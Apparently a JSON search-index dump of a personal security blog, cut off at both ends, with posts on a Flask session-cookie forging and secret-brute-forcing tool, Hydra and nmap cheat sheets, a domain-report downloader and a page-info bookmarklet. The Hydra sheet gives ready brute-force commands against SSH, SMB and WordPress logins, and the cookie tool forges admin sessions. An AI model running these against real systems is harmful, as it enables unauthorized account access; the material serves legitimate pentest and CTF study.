necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. \u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Basic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; ","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; 